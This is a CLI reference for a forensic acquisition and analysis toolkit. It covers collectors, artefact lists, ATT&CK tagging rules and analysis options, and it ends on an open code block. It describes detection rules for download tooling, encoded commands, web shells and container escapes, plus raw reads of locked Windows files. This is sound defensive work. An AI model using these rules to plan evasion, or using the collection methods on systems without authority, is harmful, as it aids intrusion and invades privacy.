# Rowanholt CLI Reference

**Version:** 2.1.0

Every command below can be run through the `rowanholt` command from any directory (see [The `rowanholt` command](#the-rowanholt-command)); called directly, they run from the repository root. The Python modules are run with `python3 -m src.analysis.…`. Don't run them from inside `src/analysis`: Elrond's `platform/` package shadows the standard library `platform` module there, so anything that imports numpy or pandas loads `elrond.py` and fails on its arguments.

---

## Table of Contents

1. [The `rowanholt` command](#the-rowanholt-command)
2. [Overview](#overview)
3. [Gandalf - Acquisition](#gandalf---acquisition)
4. [Elrond - Analysis](#elrond---analysis)
5. [MITRE ATT&CK Tools](#mitre-attck-tools)
6. [Cloud Forensics](#cloud-forensics)
7. [Eru (AI Analyst)](#eru-ai-analyst)
8. [SIEM Integration](#siem-integration)
9. [Docker Administration (Anduril)](#docker-administration-anduril)
10. [Utility Commands](#utility-commands)
11. [Configuration](#configuration)
12. [Common Workflows](#common-workflows)

---

## The `rowanholt` command

`rowanholt` at the repository root runs everything: the Docker stack, Gandalf, Elrond, Mordor, Anduril, the lab, and every script under `scripts/`. Link it into a directory on your `PATH` once and it runs from anywhere:

```bash
./rowanholt install            # links ~/.local/bin/rowanholt; or: ./rowanholt install /usr/local/bin
rowanholt help
```

It follows its own link back to the repository, so moving the clone means running `install` again. `rowanholt uninstall` removes the link.

| Command | Runs |
|---|---|
| `rowanholt start \| stop \| restart \| status [--testing] [--logs]` | The Docker stack (`--testing` leaves out Splunk and Elastic) |
| `rowanholt start --progress[=zenity]` | The same, reporting progress and an ETA learnt from earlier starts (what the desktop apps show) |
| `rowanholt server init <hostname> [--tls internal\|<email>\|files]` | Turns this install into a team server; `start`, `stop` and `status` then use the server profile (`--server` forces it). See `docs/SERVER.md` |
| `rowanholt server users <list\|add\|password\|role\|disable\|enable>` | A server's accounts |
| `rowanholt server ca` | Prints the root certificate clients trust when the server uses Caddy's own CA |
| `rowanholt gandalf [bash\|python] <args>` | `gandalf.sh` (the default) or `gandalf.py` |
| `rowanholt acquire <args>` | Gandalf through the Python CLI |
| `rowanholt analyse <args>` | Elrond (`analyze` works too) |
| `rowanholt mordor <command>` | Security datasets: `list`, `download`, `info`, `local`, `verify`, `refresh`, `stats` |
| `rowanholt anduril <command>` | Container administration (also `aragorn`) |
| `rowanholt web` | The web UI and API without Docker |
| `rowanholt lab <command>` | The test lab, `lab/lab.sh` |
| `rowanholt scripts` | Lists every script under `scripts/` |
| `rowanholt <group> <name> [args]` | One of them, e.g. `rowanholt jobs status`, `rowanholt siem splunk-restart`, `rowanholt docker clean` |
| `rowanholt map [realm\|elrond\|gandalf\|journey]` | Opens an architecture page; `journey` (3D, also `machine`) is served on 127.0.0.1:5690 until Ctrl-C |
| `rowanholt app [install\|uninstall] [--dock]` | The desktop app: builds `Rowanholt.app` on macOS (`--dock` pins it), a menu entry on Linux; see `app/README.md` |
| `rowanholt where` | Prints the repository path |

Forensic commands keep the directory you call them from, so relative evidence and output paths work as typed. Scripts under `scripts/` and the stack commands run from the repository root. Scripts are found when they're run (`scripts/<group>/<group>-<name>.sh`, `scripts/<group>/<name>.sh` or `.py`, or `scripts/<name>.sh`), so a new script needs no wiring. Python commands use `python3`; set `ROWANHOLT_PYTHON` to use a virtualenv with Rowanholt's requirements installed instead. The Windows collector is PowerShell and runs on Windows: `Invoke-Gandalf.ps1` in `src/acquisition/windows`.

---

## Overview

| Tool | Entry point | Purpose |
|---|---|---|
| Gandalf | `src/acquisition/python/gandalf.py`, `src/acquisition/bash/gandalf.sh`, `src/acquisition/windows/Invoke-Gandalf.ps1` | Live acquisition, local or remote |
| Elrond | `src/analysis/elrond.py` | Collection, processing and analysis of images and acquisitions |
| MITRE tools | `src.analysis.mitre.cli`, `src.analysis.mitre.coverage_cli` | ATT&CK data, technique mapping, coverage |
| Cloud tools | `src.analysis.rowanholt.cloud.cli` | AWS, Azure and GCP acquisition and log analysis; Kubernetes audit logs |
| AI tools (Eru) | `src.analysis.rowanholt.ai.cli` | Natural-language queries over case output |

The web UI and API (see [API.md](API.md)) drive Elrond through the same command line.

---

## Gandalf - Acquisition

### Overview

Gandalf collects artefacts from a live host, in order of volatility, into an archive (zip from the Python and PowerShell collectors, tar.gz from bash), optionally encrypted, with a SHA-256 manifest (`log.meta`) and an audit log (`log.audit`) for chain of custody.

| Variant | Path | Runs on |
|---|---|---|
| Python | `src/acquisition/python/gandalf.py` | Linux, macOS |
| Bash | `src/acquisition/bash/gandalf.sh` | Linux, macOS (stock bash 3.2 is enough) |
| PowerShell | `src/acquisition/windows/Invoke-Gandalf.ps1` | Windows |

---

### Python Syntax

```bash
sudo python3 src/acquisition/python/gandalf.py ENCRYPTION ACQUISITION [OPTIONS]
```

- `ENCRYPTION`: `Key` (recommended; generates a key file), `Password` (key derived with PBKDF2) or `None`
- `ACQUISITION`: `Local` or `Remote`

| Option | Does |
|---|---|
| `-O, --OutputDirectory [DIR]` | Where to write the archive |
| `-M, --Memory` | Acquire live memory (AVML on Linux, osxpmem on macOS) |
| `-A, --AccessTimes` | Record last-access times for every file |
| `-F, --CollectFiles` | Collect files whose names match entries in `lists/files.list` |
| `-L, --LiveContainers` | Linux: ask Docker and Podman about their running containers (see below) |

Remote mode reads target hosts from `src/acquisition/lists/hosts.list` (lines starting `#` are skipped) and prompts for each host's IP address, username and password over SSH. Run it from `src/acquisition/`, because the script opens `lists/` and `tools/` relative to the current directory.

```bash
cd src/acquisition

# Local, key-encrypted, with memory
sudo python3 python/gandalf.py Key Local -M -O /evidence/CASE-001

# Remote, password-encrypted; hosts come from lists/hosts.list
sudo python3 python/gandalf.py Password Remote -O /evidence/CASE-001
```

Decrypt an archive with `python3 src/acquisition/python/passkey_decrypt.py`.

---

### Bash Syntax

```bash
sudo ./src/acquisition/bash/gandalf.sh ENCRYPTION MODE [OPTIONS]
```

| Option | Does |
|---|---|
| `-o DIR` | Output directory (default `/tmp/gandalf/acquisitions`) |
| `-m` | Acquire memory |
| `-a` | Collect access times |
| `-c` | Collect files listed in `files.list` |
| `-l` | Linux: ask Docker and Podman about their running containers (see below) |
| `-h HOST`, `-u USER` | Remote host and user |
| `-f FILE` | Hosts file for batch remote acquisition |

**Live containers (`-l`, `gandalf.py -L`, `Invoke-Gandalf.ps1 -LiveContainers`).** Off by default, because it asks the runtime rather than reading its files: Docker's and Podman's daemons log the calls, and an export reads the container's whole filesystem. Neither pauses nor stops a container. For each running container it saves `docker|podman inspect`, `top` (PID, PPID, user, elapsed time, command) and `export`, cut at `GANDALF_CONTAINER_EXPORT_MAX` bytes (2 GB by default; `0` leaves exports out), into `live_containers/<runtime>/<id>/`. Every command goes in `log.audit` with the status `ran` instead of `collected`, an export that was cut saying so. Rootless Podman keeps each user's containers to that user (root's `podman` doesn't list them), so every user with `~/.local/share/containers/storage` is asked as themselves too (`runuser -l`, or `su -l`), with their `/run/user/<uid>` when it exists, and the audit names them: `podman (rootless, alice) top <id>`. Elrond reads the processes into `container_processes.jsonl` (`suspicious command` flagged as for start-up scripts) and keeps `inspect.json` and `export.tar` in `raw/` for the analyst. On Windows, `-LiveContainers` asks Docker (Docker Desktop's, or Windows Server's) the same, into `raw\live_containers\docker\<id>\`; a Windows container's `top` can't take ps's columns, so it's kept as `top-windows.txt` and not parsed. The web app's New Acquisition page offers it for all three. CRIU checkpoints (process memory) stay out: they need Docker's experimental mode and can stop the container.

```bash
sudo ./src/acquisition/bash/gandalf.sh None Local
sudo ./src/acquisition/bash/gandalf.sh Password Local -m -o /evidence
sudo ./src/acquisition/bash/gandalf.sh Key Remote -h 192.168.1.100 -u analyst
```

---

### PowerShell Syntax

```powershell
.\src\acquisition\windows\Invoke-Gandalf.ps1 -EncryptionObject Key -Acquisition Local `
  -OutputDirectory C:\TEMP\gandalf\gandalf -Memory -ShowProgress -CollectFiles
```

`-EncryptionObject` takes `Key`, `Password` or `None`; `-Acquisition` takes `Local` or `Remote` (remote targets come from `src\acquisition\lists\hosts.list`). The switches are `-Memory`, `-ShowProgress`, `-CollectFiles`, `-NoPrompt` (accept every default) and `-LiveContainers` (see live containers above). With no arguments it runs `-EncryptionObject None -Acquisition Local -OutputDirectory C:\TEMP\gandalf\gandalf`.

#### Collection order and integrity

All three collectors copy everything into their local working directory first, in order of volatility (RFC 3227), and hash it only afterwards:

| Order | Windows | Linux | macOS |
|---|---|---|---|
| 1. Live state | network connections, processes | `ss`/`netstat`, `ps` | `netstat`, `lsof`, `ps` |
| 2. Memory (`-M`) | DumpIt | AVML | osxpmem |
| 3. Rest of the live state | services, drivers, tasks, system info | `lsmod`, `env`, loaded modules, executables in `/tmp` and `/dev/shm` | kexts, `launchctl`, sessions |
| 4. Journals and memory-backed files | `$LogFile`, `$UsnJrnl:$J`, `pagefile.sys`, `swapfile.sys`, then `$MFT` | | `/private/tmp`, `/Users/Shared` |
| 5. Logs that roll over | event logs, prefetch, PowerShell history | `/var/log` and the journal | `/var/log`, `/Library/Logs` |
| 6. Everything else | registry, locked files (Amcache, SRUM, setupapi, hiberfil), WMI, system and user artefacts | configuration, persistence, users | configuration, persistence, users, unified-log export |

Connections and processes take seconds to list and the memory dump takes minutes, so they go first. `$LogFile` is a circular log that wraps in minutes on a busy host. Prefetch is rewritten whenever a program runs, Gandalf's own PowerShell included.

Hashing waits until everything is copied, so it doesn't widen the window in which the system changes under the collection. Each collector then writes `log.meta` (`hostname,file_path,sha256_hash`, the path being where the file sits in the archive) and archives it with `log.audit`, which records when each artefact was taken. When Elrond extracts the archive it hashes every file again and writes `<host>/gandalf_integrity.jsonl` with a status per file: `verified`, `MISMATCH`, `missing` or `unhashed`. The summary also goes to Elrond's audit log. Archives from collectors older than this recorded source paths instead, which can't be checked; Elrond says so and carries on.

The collection still writes to the disk it's collecting from (`C:\TEMP\gandalf` on Windows, `/tmp/gandalf` on Linux and macOS), which itself changes `$MFT`, `$LogFile` and the journals. Writing to other media with `-O` avoids that.

#### Locked files and `disk_tools.zip`

Windows holds many artefacts open (registry hives, `Amcache.hve`, `SRUDB.dat`, the Search and BITS databases, `$MFT`, `$LogFile`, `$UsnJrnl:$J`). Gandalf tries an ordinary copy first and, when that's refused, reads the file straight off the volume with its own NTFS reader (`GandalfNtfs`, compiled in Windows PowerShell 5.1 by `Add-Type`): boot sector, MFT, attribute lists, sparse and partially initialised streams, and alternate data streams such as `$UsnJrnl:$J`. It needs admin and no third-party tools, and reads by MFT record, so it isn't affected by file locks. The reader was checked byte for byte against The Sleuth Kit on a Windows 10 image (`$MFT`, `$LogFile`, `$J`, hives, Amcache, SRUM, hosts); compressed and EFS-encrypted files are refused rather than copied wrongly.

`tools\disk_tools.zip` (RawCopy and Sleuth Kit; not shipped, as it holds third-party binaries) is now only a fallback for files the reader can't take:

| Artefact | How Gandalf gets it |
|---|---|
| `$MFT`, `$LogFile`, `$UsnJrnl:$J` | raw volume read |
| Registry hives and their `.LOG1`/`.LOG2`, `RegBack`, `NTUSER.DAT`, `UsrClass.dat` | copy, else raw volume read |
| `Amcache.hve`, `SRUDB.dat` | copy, else raw read, else RawCopy, else a temporary shadow copy of C: (deleted afterwards, noted in `log.audit`) |
| `hiberfil.sys`, `pagefile.sys`, `swapfile.sys` | copy, else raw read, else RawCopy |

Creating the shadow copy writes to the target's System Volume Information and adds VSS events to its logs; it's only reached when everything before it failed.

On Windows, beyond the event logs, registry, prefetch, `$MFT` and browsers, Gandalf collects into `raw\<folder>\`:

| Folder | Artefacts | Elrond parses with |
|---|---|---|
| `recyclebin` | `$Recycle.Bin` `$I` files | Artemis |
| `tasks` | `System32\Tasks` XML | Artemis |
| `startup` | Startup folders (all users and each user) | Elrond; tags **T1547.001** |
| `bits` | BITS `qmgr.db` / `qmgr*.dat` | Artemis |
| `search` | `Windows.edb` / `Windows.db` | Artemis |
| `lnk` | Recent, Office Recent and Desktop shortcuts | Artemis |
| `defender` | `MPLog`, `MPDetection`, DetectionHistory | Elrond |
| `pca` | Program Compatibility Assistant (Windows 11 22H2+) | Elrond |
| `wer` | `Report.wer` (system and per user) | Elrond |
| `notepad` | Windows 11 Notepad TabState | Elrond |
| `registry\original` | hive files, transaction logs, RegBack | collected for the analyst |
| `thumbcache` | Explorer thumbnail and icon caches | Elrond: `thumbcache.jsonl`, each image saved to `cooked/thumbcache/<database>/` |
| `powershell` | PSReadLine `ConsoleHost_history.txt` per user | Elrond: `powershell_history.jsonl`, download, encoded-command, Defender-tampering and other lines tagged (**T1059.001**, **T1105**, **T1027**, **T1562.001** and so on) |
| `rdpcache` | RDP bitmap cache | collected for the analyst |

The USN journal is parsed with the `$MFT` beside it, so journal entries carry full paths. `$LogFile` is decoded into `ntfs_logfile.jsonl`: names added to and removed from directories, MFT records initialised and freed, and renames (a removal and an add of the same file in one transaction), each with its `$FILE_NAME` times. It covers the last minutes to hours before collection, even where `$MFT` entries have been reused. `pagefile.sys`, `swapfile.sys` and `hiberfil.sys` are searched for URLs, command lines, Run-key paths, executable paths, e-mail and IPv4 addresses (`paged_strings.jsonl`, one row per distinct string with its first offset and count) whether or not `--Memory` is set; with it, the paging files also go to Volatility. `Amcache.hve` goes to Artemis.

---

### Output Structure

```
<host>.zip            # or <host>.zip.enc when encrypted
├── artefacts/
│   ├── host.info     # system information
│   ├── <host>.mem    # memory (Linux); mem.aff4 / mem.raw on macOS
│   └── …             # logs, plists, registry, browser and user artefacts by type
├── log.audit         # SHA-256 of every acquired file
└── log.meta          # acquisition metadata
```

Gandalf encrypts with Fernet (AES-128-CBC with HMAC-SHA256); `gandalf.sh` uses OpenSSL AES-256-CBC, and in Key mode the key comes back as `<host>.shadowfax.key` beside the archive. Decrypt before analysis: Elrond reads unencrypted archives only, and prints the `openssl` command for a `.tar.gz.enc`.

On macOS, both the Bash and Python collectors gather:

| Area | Artefacts |
|---|---|
| Persistence | LaunchAgents, LaunchDaemons and StartupItems (system, Apple's own and per user), per-user preferences, cron/at tabs |
| Execution | zsh and bash history, including `~/.zsh_sessions`; shell start-up files |
| Logs | `/var/log`, `/Library/Logs`, `/etc/security` |
| Downloads and privacy | Quarantine events (`QuarantineEventsV2`), TCC databases, KnowledgeC |
| Browsers | Safari (`History.db`, downloads, bookmarks), Chrome, Firefox |
| Staging | `/Users/Shared`, `/private/tmp` and each user's Trash, files up to 10 MB |
| Change journal | FSEvents (`/System/Volumes/Data/.fseventsd`, or `/.fseventsd` before 10.15), files up to 64 MB |
| Volatile | Processes, `netstat`, `lsof`, loaded kexts, `launchctl list`, logins |
| Background items | Background Task Management stores (`BackgroundItems-v*.btm`, per-user `backgrounditems.btm`): login items, agents and daemons as macOS 13+ tracks them |
| Recent items | Shared file lists (`*.sfl2`, `*.sfl3`): recent documents, applications, servers |
| Execution policy | `ExecPolicy`, `KextPolicy`, XProtect's `XPdb` and bundle version, Notification Center's database |
| Scheduled and event | `/etc/periodic`, `periodic.conf`, `*.local`, `launchd.conf`, `rc.common`, emond rules and clients |
| Usage | `InstallHistory.plist`, PowerLog, Biome streams (up to 2,000 files of 10 MB) |
| Unified logs | A filtered export (`log show --style ndjson`) of sudo, su, sshd, loginwindow, screen sharing, syspolicyd, XProtect, authd, TCC and BTM events over the last day (`GANDALF_UNIFIED_LOG_WINDOW`, e.g. `3d`), capped at 500,000 events |
| Unified-log store | The raw store: `uuidtext/` first, then the `tracev3` files under `diagnostics/`, newest first, up to 2 GB (`GANDALF_UNIFIED_LOG_STORE_MAX`, in bytes; `0` turns it off), into `unified_log_store/` with its layout kept for log-archive readers |
| Spotlight | Each volume's index stores (`store.db`, `.store.db`, the `dbStr-*.map.*` files `store.db` can't be read without, `VolumeConfiguration.plist`), each file up to 1 GB (`GANDALF_SPOTLIGHT_MAX`; `0` turns it off), into `spotlight/` |

TCC.db, KnowledgeC, Safari, Mail, ExecPolicy and XPdb are protected by macOS: they're only readable when the process collecting them has Full Disk Access (for Remote mode, enable "Allow full disk access for remote users" under System Settings → General → Sharing → Remote Login). Anything unreadable is skipped and left out of `log.meta`. SQLite databases come with their `-wal`, so rows not yet checkpointed aren't lost. Elrond parses the export above into `unified_log.jsonl`, and the raw store (in `raw/unified_log_store/`, also taken from a macOS disk image, by the same rules) into `unified_log_store.jsonl`, keeping the same processes and subsystems as the export, over however far back the store goes. The store reader (`process/extractions/tracev3.py`, stdlib) reads LZ4 chunksets (macOS up to 26) and LZBITMAP ones (macOS 27), resolves format strings from `uuidtext/` and the shared cache's `dsc/`, and times each message from `timesync/`; it reads log messages only (not activities, signposts or state dumps), arguments logged as private read `<private>`, and Apple's own value decoders (`%{network:…}`, masked hashes, enum names) print the raw value. On a macOS 27 store (LZBITMAP) it matched `log show` on 97 to 99.9% of messages; on the lab's macOS 15 store (LZ4), 1,744 of the 1,745 messages found in both matched exactly, time included. A copy of the store lacks what `logd` still held in memory when it was taken (136 of the export's 1,881 messages on the lab VM). Spotlight's index is parsed into `spotlight.jsonl` (below).

Elrond parses the macOS additions into `btm_items.jsonl` (third-party items flagged; enabled ones tag **T1543.001** or **T1547.015**), `shared_file_lists.jsonl` (paths decoded from the bookmarks), `notifications.jsonl`, `execpolicy_*.jsonl`, `kextpolicy_*.jsonl` (third-party kexts tag **T1547.006**), `xprotect_*.jsonl`, `emond_rules.jsonl` (**T1546.014**), `periodic.jsonl`, `unified_log.jsonl` and `unified_log_store.jsonl`, and also:

| Artefact | Elrond output |
|---|---|
| TCC databases | `tcc.jsonl`: every grant and denial, sensitive ones (Full Disk Access, Accessibility, Screen Recording, Apple Events, camera, microphone) flagged; a technique is tagged only for a client that runs from a temp, shared or hidden path |
| KnowledgeC | `knowledgec.jsonl`: each event's stream, value, start, end and app |
| Quarantine events | `quarantine_events.jsonl`: what was downloaded, by which app, from where; downloads by curl, scripts or Terminal and bare-IP URLs flagged (**T1105**) |
| Biome streams | `biome.jsonl`: each SEGB record (v1 and v2) with its stream, state, times and the strings in its protobuf payload |
| ASL stores | `asl.jsonl`: `/var/log/asl`, DiagnosticMessages and powermanagement records with sender, level, IDs and key/value pairs |
| FSEvents | `fsevents.jsonl`: path, event ID, flags (created, removed, renamed, modified…) and inode, with each page file's time |
| Spotlight index | `spotlight.jsonl`: one row per indexed item, its path rebuilt from the index itself, with content type, kind, created, modified, last used, use count, date added, downloaded, where-froms (download URLs), size and owner, the rest in `Other`; `Complete` is "no" for a record that couldn't be read to its end. Elrond's image collection takes the stores too. Checked against `mdls` on a test volume (every value matched); Apple's per-user CoreSpotlight stores, which Gandalf doesn't take, read less fully |
| Staging folders | `staged_files.jsonl`: every file collected from `/Users/Shared` and `/private/tmp` with its hash; hidden names tag **T1564.001**, download tooling **T1105** |

PowerLog is collected for the analyst only.

On Linux, both collectors also take, into `linux/` (Elrond's image collection takes the same set):

| Area | Artefacts | Elrond output |
|---|---|---|
| Logins | `utmp`, `wtmp`, `btmp`, `lastlog`, `faillog`, and `wtmpdb`/`lastlog2` (Ubuntu 24.04+) | `login_records.jsonl`, `lastlog.jsonl`, `faillog.jsonl`; repeated btmp failures tag **T1110.001** |
| Loader and shell start-up | `ld.so.preload`, `ld.so.conf(.d)`, `/etc/environment`, `/etc/profile(.d)`, `bash.bashrc`/`bashrc`, `rc.local`, `update-motd.d` | `preload.jsonl` (**T1574.006**), `shell_init.jsonl` (**T1546.004**, **T1037.004**) |
| Authentication | PAM stacks, `sudoers` and `sudoers.d` | `pam.jsonl` (**T1556.003**), `sudoers.jsonl` (**T1548.003**) |
| Persistence | XDG autostart (system and per user), per-user systemd units, systemd generators, udev rules | `autostart.jsonl` (**T1547.013**, **T1543.002**), `generators.jsonl`, `udev_rules.jsonl` (**T1546.017**) |
| Kernel | loaded modules with their file and SHA-256 (live only) | `kernel_modules.jsonl`; modules with no file, or one outside `/lib/modules`, tag **T1547.006** |
| Staging | executables (ELF, scripts, exec bit) in `/tmp`, `/var/tmp`, `/dev/shm`, listed with hashes; the files themselves (up to 10 MB) into `tmp/`, `var_tmp/`, `dev_shm/` | `tmp_executables.jsonl`, `staged_files.jsonl` (hidden names **T1564.001**, download tooling **T1105**) |
| Scheduled | `/etc/crontab`, `cron.d`, `cron.daily` and the like, per-user crontabs (`/var/spool/cron`), at jobs | `cron.jsonl` (jobs from temp or hidden paths, or with download or shell tradecraft, tag **T1053.003**), `at_jobs.jsonl` (**T1053.002**) |
| SSH and accounts | `authorized_keys`, `known_hosts`, `sshd_config`, `passwd` with `shadow` | `ssh_keys.jsonl` (forced commands, root keys, keys whose comment names another host: **T1098.004**), `sshd_config.jsonl`, `accounts.jsonl` (password state and hash type only, never the hash; a second UID 0 tags **T1136.001**) |
| Web | web-root scripts (`/var/www`, `/srv/www`, `/srv/http`, nginx html; up to 5,000 of 1 MB) and nginx/Apache configs | `webshells.jsonl` (**T1505.003**) |
| Histories | zsh, vim (`.viminfo`), less, python, mysql, psql, wget HSTS, `recently-used.xbel` | `shell_histories.jsonl`, `viminfo.jsonl`, `wget_hsts.jsonl`, `recently_used.jsonl` |
| Docker | each container's `config.v2.json` and `hostconfig.json`, its `json-file` log (up to 64 MB); each container's writable layer (everything changed since its image, deleted files included) listed with hashes, and the executables and scripts among those changes copied (up to 500 per container, 64 MB each, into `container_layer/<id>/`); containerd's `meta.db`; Podman's state (`db.sql` with its `-wal`, or `libpod/bolt_state.db` before 4.8), rootful and each user's rootless store (`~/.local/share/containers/storage`), and Podman/CRI-O's `containers.json` | `docker_containers.jsonl` (privileged, a runtime socket or a sensitive host path mounted, the host's namespaces, escape capabilities: **T1611**, and **T1610** when it was also told to run a shell or fetch something), `container_logs.jsonl`, `container_changes.jsonl` (executables dropped in temp or hidden paths **T1105**; cron, SSH keys, accounts, `ld.so.preload` or shell start-up changed inside a container tag their technique); the copied executables in `staged_files.jsonl` as `container <id>:/path` (hash, executable, hidden name, download commands); containerd's containers from `meta.db` in `docker_containers.jsonl` as well (`Runtime` `containerd`; every namespace but Docker's `moby`), flagged by the same rules; Podman's containers likewise (`Runtime` `podman`, or `podman (rootless, <user>)`, from either store; its API socket counts as a runtime socket); `containers.json` is kept unparsed (it holds names and images, not settings) |
| Kubernetes node | static pod manifests (`/etc/kubernetes/manifests`), pod logs (`/var/log/pods`), the API server's audit log (`/var/log/kubernetes`) | `static_pods.jsonl` (a static pod that isn't the control plane's: **T1543.005**, **T1611** if it can reach the host), `container_logs.jsonl`, `k8s_audit.jsonl` (secrets read **T1552.007**, exec into pods **T1609**, cluster-admin bindings **T1098.006**, service-account tokens **T1528**, jobs **T1053.007**, privileged pods **T1611**, cluster-wide discovery **T1613**) |

Endpoint antivirus on the analysis machine may quarantine or block collected web shells (and archives holding them), so they can be missing from `webshells.jsonl`; Elrond logs the file as unreadable ("Operation not permitted") and carries on. Exclude the case directory from scanning if that matters.

Pass the directory holding the archives to Elrond with `--Gandalf`. It must end in `acquisitions/` (subfolders per host are fine). Elrond extracts each archive, maps Gandalf's layout onto its own (`etc+passwd` → `raw/passwd`, `user/<name>/.zsh_history` → `raw/user_profiles/<name>+zsh_history`, `browsers/<browser>/<name>+History` → `raw/browsers/<name>/<browser>/History`, and so on), then runs processing, keyword search and analysis exactly as for a disk image. An archive with a member that points outside it is refused as possible tampering.

---

## Elrond - Analysis

### Overview

Elrond automates forensic analysis of acquired evidence, processing artifacts through multiple analysis phases.

### Syntax

```bash
python3 src/analysis/elrond.py CASE_ID SOURCE_DIR [DEST_DIR] [OPTIONS]
```

- `CASE_ID`: case or incident identifier
- `SOURCE_DIR`: directory holding the evidence (disk and memory images, Gandalf archives or Mordor datasets)
- `DEST_DIR`: output directory (default: current directory)

Elrond defines long options only. argparse accepts any unambiguous prefix (`--Coll` for `--Collect`), but there are no single-letter flags. The web UI and API build the same command (`build_elrond_command` in `src/web/backend/tasks_docker.py`).

Memory analysis reads memory images from `SOURCE_DIR` alongside the disk images; there is no separate memory path option.

---

### Evidence Sources

| Option | Reads |
|---|---|
| `--Collect` | Disk and memory images (E01, raw/dd, VMDK, VHD/VHDX); Elrond mounts them and collects artefacts |
| `--Gandalf` | Gandalf acquisitions (`.zip`, `.7z`, `.tar.gz`) in a directory ending `acquisitions/`; each host is extracted to `DEST_DIR/<host>/artefacts/raw/` and processed like a collected disk image |
| `--Mordor` | OTRF Mordor attack-simulation datasets |

---

### Modes

| Option | Enables |
|---|---|
| `--Brisk` | `--Analysis`, `--extractIocs`, `--Navigator`, `--Process`, `--Userprofiles` |
| `--ThreatHunt` | Aggressive threat hunting: `--Analysis`, `--extractIocs`, `--Memory`, `--Navigator`, `--Process` and more; needs the SIEM services up |
| `--eXhaustive` | Every option: Brisk plus `--Delete`, `--Elastic`, `--Memory`, `--nsrl`, `--Splunk`, `--Timeline`, `--memorytimeline` |

`--Brisk` is not faster than a plain run: it adds analysis and IOC extraction. See [PERFORMANCE.md](PERFORMANCE.md) for what each option costs.

---

### Options

**Phases**

| Option | Does |
|---|---|
| `--Process` | Parse collected artefacts (always runs) |
| `--Analysis` | MFT analysis: extended attributes other than Windows' own, and timestomping ($SI created before $FN created) of executables and scripts in user-writable paths; hits under `Users\Default` and `ProgramData\Microsoft` are marked likely benign (Windows setup copies them with their original times). Alternate data streams from the raw `$MFT`; Mark of the Web, WOF compression and other Windows streams are marked likely benign. On a case of two or more hosts, also stacking: processes, parent and child pairs, services, scheduled tasks, autoruns, WMI consumers, drivers (Sysmon 6) and kernel modules found on few of the hosts of the same OS, Linux hosts within their distribution family (three or more of that OS or family before anything counts as rare; with fewer, only `--stackBaseline` finds anything), ranked in the case's `stacking.jsonl` with the reasons for each score (rare, user path, generated name, not in baseline, and the host's own: unsigned modules and drivers, BTM items with no Team ID, first seen outside the host's logon hours), and the host row each value was read from (`Host`, `Artefact`, `Row`, the case browser's reference; `Sources` lists it for every host with the value) so it can be flagged there. Nothing is tagged with a technique on a score |
| `--stackBaseline FILE` | A baseline of clean hosts for stacking; values absent from it score higher. Build one with `python3 -m rowanholt.analysis.stacking --baseline OUT CASE_DIR ...` (from `src/analysis`) |
| `--Memory` | Volatility 3 analysis of memory images |
| `--Timeline` | Plaso timeline of the disk image. Very slow (105 min on a 12 GB E01) |
| `--memorytimeline` | Volatility timeliner on memory images |

**Collection and processing**

| Option | Does |
|---|---|
| `--vss` | Collect and process every Volume Shadow Copy. Each copy costs about as much as the live volume |
| `--Userprofiles` | Collect user profile artefacts |
| `--collectFiles [FILTER]` | Collect files by type (binaries, documents, scripts, …); optional inclusion/exclusion file. Selecting all types includes carving |
| `--symlinks` | Follow symbolic links when copying folders. Slow |
| `--extractIocs` | Extract IOCs from processed files. Slow |
| `--iocsFile FILE` | Match extracted IOCs against a watchlist |
| `--threatIntel FILE [FILE ...]` | Match the case against threat intelligence: the Iran APT workbook, STIX 2.1 bundles, MITRESaw procedures, Rowanholt's CSV or a text watchlist. Writes `<host>/analysis/threat_intel_matches.jsonl`, fills `watchlist_match` in `iocs.jsonl`, and ranks groups in the case's `threat_groups.jsonl` with the basis for each rank. Runs after the analysis phase |
| `--Keywords FILE` | Search for keywords. Remove blank and `#` lines first: they match every line |
| `--Yara DIR` | Scan with YARA rules, against the whole mounted image or only collected files. Symbolic links are not followed (`yara -N`). A rule whose `meta` has `attack = "T1059.001, T1105"` (or `mitre`, `technique`) tags those techniques when it matches; any match on a web-root script tags **T1505.003** |
| `--misplacedBinaries` | Find Windows system binaries in unexpected locations (**T1036.005**) |
| `--masquerading` | RLO characters, double extensions, trailing spaces, renamed utilities (**T1036**) |
| `--ClamAV` | ClamAV over the collected files and the image's user-writable folders (all of a Gandalf collection); detections are `ClamAV` rows in `analysis.jsonl`. Signatures are the worker image's, refreshed first only if `ROWANHOLT_ONLINE_LOOKUPS` lists `freshclam` |
| `--magicBytes` | Verify file signatures |

**Hashing**

| Option | Does |
|---|---|
| `--hashCollected` | Hash collected and processed artefacts and their metadata |
| `--hashAll` | Hash every file on the mounted images |
| `--metacollected` | Hash and extract metadata only for collected artefacts |
| `--nsrl` | Compare hashes against NSRL known-goods (needs Internet access) |

**Output**

| Option | Does |
|---|---|
| `--Splunk` | Index output into the local Splunk instance |
| `--Elastic` | Index output into the local Elasticsearch instance |
| `--Navigator` | Build an ATT&CK Navigator layer from the case's `mitre_techniques.txt` |
| `--Ziparchive` | Zip raw data after processing |
| `--Delete` | Delete raw data after processing |

SIEM options fail fast if the service is unreachable. Start them with `docker compose --profile siem up -d`.

---

### Examples

```bash
# Collect and process a disk image
python3 src/analysis/elrond.py CASE-001 /evidence /output/CASE-001 --Collect --Process

# Add analysis
python3 src/analysis/elrond.py CASE-001 /evidence /output/CASE-001 --Collect --Process --Analysis

# Disk and memory together (both images in /evidence)
python3 src/analysis/elrond.py CASE-001 /evidence /output/CASE-001 --Collect --Process --Analysis --Memory

# Brisk mode
python3 src/analysis/elrond.py CASE-001 /evidence /output/CASE-001 --Collect --Brisk

# IOC extraction and YARA
python3 src/analysis/elrond.py CASE-001 /evidence /output/CASE-001 \
  --Collect --Process --Analysis --extractIocs --Yara /opt/yara-rules

# Shadow copies and user profiles
python3 src/analysis/elrond.py CASE-001 /evidence /output/CASE-001 --Collect --Process --vss --Userprofiles

# SIEM export with Navigator layer
python3 src/analysis/elrond.py CASE-001 /evidence /output/CASE-001 \
  --Collect --Process --Analysis --Splunk --Elastic --Navigator
```

---

### Output Structure

Elrond writes one directory per case, with one subdirectory per image. Every table is JSON Lines (`.jsonl`): one record per line, each starting with the same five fields, `host`, `artefact` (the table's path under `cooked/` without the suffix), `source_path` (what it was parsed from), `timestamp` (ISO 8601 UTC, or null when the artefact has no time) and `techniques` (the ATT&CK IDs that record shows), then the artefact's own fields. A row reference is the line number. The case browser's **Download as CSV** gives any table as a spreadsheet. Cases processed before November 2026 have CSV and JSON tables, which everything still reads. See `docs/OUTPUT_FORMAT.md`.

```bash
